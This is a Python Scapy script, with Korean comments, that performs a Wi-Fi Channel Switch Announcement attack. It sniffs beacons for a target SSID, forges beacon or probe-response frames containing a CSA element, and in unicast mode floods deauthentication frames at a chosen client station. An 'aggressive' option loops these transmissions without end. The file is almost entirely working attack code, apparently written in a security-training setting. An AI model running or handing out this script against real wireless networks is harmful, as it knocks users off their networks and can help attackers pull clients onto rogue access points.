from scapy.all import *
import time
import sys
import argparse
import re
import threading

parser = None
mac_list = []
csa_packets = []
deauth_packets = []
conf.verb=0

##################################################################################################
#						usage
# aggressive를 True로 놓고 쓰는게 좋음
# broadcast(beacon frame) CSA Attack
# python3 csa_attack.py -i mon0 -v KITRI_DEV5 -d broadcast --aggressive True
# unicast(Probe response frame) CSA Attack
# python3 csa_attack.py -i mon0 -v KITRI_DEV5 -d unicast -s AA:BB:CC:DD:EE:FF --aggressive True
##################################################################################################

def csa_attack(parser):
	#Broadcast CSA Attack
	if is_broadcast(parser):
		while not len(csa_packets):
			print("[*]Sniffing wild packets")
			sniff(iface=parser.interface, stop_filter = stop_filter_beacon, count = 200)
		print("[*]Beacon CSA Attack Start")
		send_beacon_csa(parser)

	#ProbeResponse CSA Attack
	else:
		while not len(csa_packets):
			print("[*]Sniffing wild packets")
			sniff(iface=parser.interface, stop_filter = stop_filter_probe, count = 200)
		print("[*]Probe Response CSA Attack Start")
		t = threading.Thread(target=send_deauth)
		t.start()
		send_probe_csa(parser)

def is_broadcast(parser):
	if parser.casting == "broadcast":
		return True
	else:
		return False

###############################################################
#					Beacon 관련 함수들
###############################################################

def stop_filter_beacon(packet):
	if packet.haslayer(Dot11Beacon):
		elt = packet.getlayer(Dot11Elt)
		dot11 = packet.getlayer(Dot11)
		beacon = packet.getlayer(Dot11Beacon)
		if bytes(parser.ssid,'utf-8') == elt.info and dot11.addr3 not in mac_list:
			print(f"[!]SSID: {elt.info}, MAC:{dot11.addr3}")
			mac_list.append(dot11.addr3)
			make_beacon_csa(parser, elt, dot11)

	return False

def make_beacon_csa(parser, elt, dot11):
	dot11_beacon = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=dot11.addr3, addr3=dot11.addr3)
	beacon = Dot11Beacon(cap=0o411)
	frame = RadioTap()/dot11_beacon/beacon
	csa = Dot11Elt(ID=0x25,len=3,info=bytes([0,253,1]))
	flag = False

	while elt != None:
		if elt.ID > 37 and flag == False:
			flag = True
			frame = frame/csa
		information_element = Dot11Elt(ID=elt.ID, len=elt.len, info=elt.info)
		frame = frame/information_element
		elt = elt.payload.getlayer(Dot11Elt)
	csa_packets.append(frame)

def send_beacon_csa_t(parser, frame):
	if parser.aggressive == True:
		sendp(frame, iface=parser.interface, inter=0.004, loop=1)
	else:
		sendp(frame, iface=parser.interface, count = 6)

def send_beacon_csa(parser):
	for frame in csa_packets:
		t = threading.Thread(target=send_beacon_csa_t, args=(parser,frame))
		t.start()


###############################################################
#					Probe Response관련 함수들
###############################################################

def stop_filter_probe(packet):
	if packet.haslayer(Dot11Beacon):
		elt = packet.getlayer(Dot11Elt)
		dot11 = packet.getlayer(Dot11)
		beacon = packet.getlayer(Dot11Beacon)
		if elt.info == bytes(parser.ssid,'utf-8') and dot11.addr3 not in mac_list:
			print(f"[!]SSID: {elt.info}, MAC:{dot11.addr3}")
			mac_list.append(dot11.addr3)
			make_probe_csa(parser, dot11)
	return False

def make_probe_csa(parser, dot11):
	# addr3에 해당하는 Probe Response Frame생성
	dot11_probe = Dot11(type=0, subtype=5, addr1=parser.sta, addr2=dot11.addr3, addr3=dot11.addr3)
	probe_resp = Dot11ProbeResp(cap=0x1111)
	essid = Dot11Elt(ID='SSID', info=parser.ssid, len=len(parser.ssid))
	ds_param = Dot11EltDSSSet(ID=0x3, len=1, channel=parser.channel)
	csa = Dot11Elt(ID=0x25,len=3,info='\x01\x24\x01')
	frame = RadioTap()/dot11_probe/probe_resp/essid/ds_param/csa
	csa_packets.append(frame)

	# addr3에 해당하는 Deauth패킷 생성
	dot11_deauth = Dot11(type=0, subtype=0xc, addr1=parser.sta, addr2=dot11.addr3, addr3=dot11.addr3)
	deauth = Dot11Deauth(reason=7)
	deauthFrame = RadioTap()/dot11_deauth/deauth
	deauth_packets.append(deauthFrame)

def send_probe_csa(parser):
	if parser.aggressive == True:
		while True:
			for probe in csa_packets:
				sendp(probe, iface=parser.interface, count = 50, inter = 0.004)

	else:
		for probe in csa_packets:
			sendp(probe, iface=parser.interface, count = 6)

def send_deauth():
	if parser.aggressive == True:
		while True:
			for deauth in deauth_packets:
				sendp(deauth, iface=parser.interface, count = 50, inter = 0.004)
	else:
		for deauth in deauth_packets:
			sendp(deauth, iface=parser.interface, count = 6)


###############################################################
#						Parser 설정
###############################################################

class PARSER:
	def __init__(self, opts):
		self.help = self.help(opts.help)
		self.interface = self.interface(opts.interface)
		self.channel = self.channel(opts.channel)
		self.ap = self.mac(opts.ap)
		self.ssid = opts.ssid
		self.casting = self.cast(opts.cast)

		if self.casting == "unicast":
			self.sta = self.mac(opts.sta)

		
		self.aggressive = opts.aggressive
	
	def help(self, _help):
		if _help:
			print("HELPPPPPP")

	def mac(self, mac_address):
		if mac_address == None:
			print("No MAC address Given")
			#exit(-1)
	
		if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", mac_address):
			return mac_address.lower()
		else:
			print("Invalid MAC Address Given")
			#exit(-1)

	def channel(self, ch):
		retval = list(range(1,164))
		if ch:
			if ch in retval:
				return ch
			else:
				print("Invalid Channel Given.")
		else:
			print("No Channel Given")
			#exit(-1)
	
	def interface(self, iface):
		def getNICnames():
			ifaces = []
			dev = open('/proc/net/dev', 'r')
			data = dev.read()
			for n in re.findall('[a-zA-Z0-9]+:', data):
				ifaces.append(n.rstrip(":"))
			return ifaces

		def confirmMon(iface):
			co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
			data = co.communicate()[0].decode()
			card = re.findall('Mode:[A-Za-z]+', data)[0]	
			if "Monitor" in card:
				return True
			else:
				return False

		if iface:
			ifaces = getNICnames()
			if iface in ifaces:
				if confirmMon(iface):
					return iface
				else:
					print("Interface Not In Monitor Mode [%s]" % (iface))
					exit(-1)
			else:
				print("Interface Not Found. [%s]" % (iface))
				exit(-1)
		else:
			print("Interface Not Provided. Specify an Interface!")
			exit(-1)

	def cast(self, casting):
		if casting == "unicast" or casting == "broadcast":
			return casting
		else:
			print("Only unicast or broadcast")
			exit(-1)


if __name__ == '__main__':
	parser = argparse.ArgumentParser(add_help=False)

	parser.add_argument('-h', '--help', dest='help', default=False, action="store_true")
	
	parser.add_argument('-i', '--interface', dest='interface', default="", type=str)
	parser.add_argument('-c', '--channel', dest='channel', default=0, type=int)
	parser.add_argument('-a', '--accesspoint', dest='ap', default="", type=str)
	parser.add_argument('-s', '--station', dest='sta', default="", type=str)
	parser.add_argument('-v', '--ssid', dest='ssid', default="", type=str)

	parser.add_argument('-d', '--casting', dest='cast', default="broadcast", type=str)
	
	parser.add_argument('--aggressive', dest='aggressive', default=False, type=bool)

	options = parser.parse_args()
	parser = PARSER(options)

	csa_attack(parser)
